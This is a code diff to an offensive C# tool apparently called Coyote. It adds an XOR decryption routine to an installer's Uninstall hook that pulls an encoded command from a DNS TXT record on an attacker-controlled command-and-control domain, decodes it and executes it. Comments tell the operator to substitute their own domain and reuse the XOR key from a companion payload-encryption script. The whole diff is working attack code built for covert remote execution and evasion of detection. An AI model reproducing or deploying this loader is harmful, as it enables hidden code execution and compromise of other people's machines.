@@ -15,6 +15,7 @@ Refer to the README.md for full usage details
 using System;
 using System.Diagnostics;
 using System.IO;
+using System.Text;
 
 namespace Coyote
 {
@@ -76,11 +77,24 @@ namespace Coyote
 			var base64EncodedBytes = System.Convert.FromBase64String(base64EncodedData);
 			return System.Text.Encoding.UTF8.GetString(base64EncodedBytes);
 		}
+
+		private string XORDecrypt(string ciphertext, string key)
+		{
+			var plaintext = new StringBuilder();
+
+			for (int cipherchar = 0; cipherchar < ciphertext.Length; cipherchar++)
+			{
+				plaintext.Append((char)((uint)key[cipherchar % key.Length] ^ (uint)ciphertext[cipherchar]));
+			}
+
+			return plaintext.ToString();
+		}
 	
 		public override void Uninstall(System.Collections.IDictionary savedState)
 		{
 			string c2domain = "updates.tartaruslabs.com";	// Change this to your own FQDN where you will place your DNS TXT record
-		
+			string XORkey = "pizza";			// Set this to the same XOR key you used in payload-encrypt.ps1		
+
 			ProcessStartInfo siNslookup = new ProcessStartInfo();
 			siNslookup.UseShellExecute = false;
 			siNslookup.RedirectStandardOutput = true;
@@ -100,7 +114,7 @@ namespace Coyote
 					{
 						strOutput = strOutput.Trim();
 						strOutput = strOutput.Trim('"');
-						ProcessStartInfo siCommand = new ProcessStartInfo(Base64Decode(strOutput));
+						ProcessStartInfo siCommand = new ProcessStartInfo(XORDecrypt(Base64Decode(strOutput),XORkey));
 						siCommand.UseShellExecute = true;
 						siCommand.RedirectStandardOutput = false;
 						Process pCommand = Process.Start(siCommand);
